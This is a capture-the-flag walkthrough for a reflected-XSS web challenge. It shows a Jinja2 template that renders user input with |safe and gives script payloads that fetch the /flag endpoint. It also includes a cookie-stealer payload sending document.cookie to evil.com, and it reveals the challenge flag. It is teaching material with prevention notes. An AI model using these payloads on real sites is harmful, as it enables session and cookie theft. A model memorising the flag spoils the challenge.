# Spirit Walkthrough

## Challenge Overview
**Difficulty**: Medium  
**Vulnerability**: Reflected XSS  
**Flag**: nhc{scr1pt3d_1llus10ns_sh4tt3r}

## Story Context
Hattori faces the Wall of Illusions, where messages can echo through the spirits if crafted with cunning.

## Solution Steps

### Step 1: Access the Challenge
1. Navigate to `/challenge/spirit`
2. Observe the message submission form

### Step 2: Understand the Vulnerability
The page reflects user input using Jinja2's `|safe` filter:
```html
<div class="message">
    <p>{{ reflected_message|safe }}</p>
</div>
```

### Step 3: Test Basic XSS
1. Submit a simple script: `<script>alert('XSS')</script>`
2. The page should execute the JavaScript

### Step 4: Craft Payload to Fetch Flag
1. Use XSS to make a request to `/flag` endpoint 
2. Capture the response and display it
3. Payload:
   ```html
   <script>
   fetch('/flag')
   .then(response => response.text())
   .then(data => alert(data));
   </script>
   ```

### Step 5: Execute and Capture Flag
1. Submit the payload in the message form
2. The JavaScript executes and shows an alert with the flag
3. Copy the flag: nhc{scr1pt3d_1llus10ns_sh4tt3r}

## Hints

### Hint 1
> The wall reflects your messages back to you. What if your message contained more than just words?

### Hint 2
> Look for hints on the page itself. There's a 💡 icon that might reveal important information.

### Hint 3
> The `/flag` endpoint returns the spirit flag directly. How can you make the page fetch it for you?

## Educational Notes

### What You Learned
- **Reflected XSS**: Malicious scripts executed in victim's browser
- **JavaScript Injection**: Using script tags to execute code
- **Fetch API**: Making HTTP requests from JavaScript
- **CSP Bypass**: Understanding Content Security Policy limitations

### Real-World Impact
- Session hijacking
- Cookie theft
- Phishing attacks
- Malware distribution

### Prevention
- Input sanitization
- Content Security Policy (CSP)
- Output encoding
- XSS protection headers
- Avoid `|safe` filter with user input

## Alternative Payloads

### Simple Alert
```
<script>alert('XSS')</script>
```

### Cookie Stealer
```
<script>
fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```

### Flag Fetcher (Advanced)
```
<script>
async function getFlag() {
    const response = await fetch('/flag');
    const flag = await response.text();
    alert(flag);
}
getFlag();
</script>
```

### Image-Based XSS
```
<img src=x onerror=alert('XSS')>
```

## Testing Tools

### Browser Console
```javascript
// Test basic XSS
document.write('<script>alert("XSS")</script>');
```

### XSS Payload Generators
- OWASP XSS Filter Evasion Cheat Sheet
- PortSwigger XSS cheat sheet

## Common Mistakes
- Forgetting to close script tags
- Not handling asynchronous operations
- Using blocked characters in CSP
- Not testing the payload in the correct context

## CSP Analysis
Current CSP allows:
- `script-src 'self' 'unsafe-inline'`
- This permits inline scripts for educational purposes

## Next Steps
Submit the fetched flag to unlock the Shadows challenge.
